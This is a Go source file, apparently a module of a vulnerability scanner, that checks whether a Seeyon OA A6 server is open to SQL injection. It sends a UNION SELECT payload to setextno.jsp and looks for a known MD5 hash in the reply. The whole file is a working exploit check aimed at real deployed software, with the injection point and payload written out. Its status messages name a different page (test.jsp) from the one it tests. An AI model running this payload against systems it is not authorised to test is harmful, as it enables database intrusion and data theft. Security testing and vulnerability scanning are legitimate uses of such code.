package A6_setextno_sqljin

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
)

func Run(url string) {
	vulnUrl := url + "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4#"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-]	致远OA A6-test.jsp-sqljni test.jsp SQL注入漏洞不存在")
		return
	}

	if resp.StatusCode == 200 && strings.Contains(resp.String(), "c4ca4238a0b923820dcc509a6f75849b") {
		color.Green.Println("[+]	目标 " + url + " 致远OA A6-test.jsp-sqljni test.jsp SQL注入漏洞存在")
	} else {
		color.Red.Println("[-]	致远OA A6-test.jsp-sqljni test.jsp SQL注入漏洞不存在")
	}
}
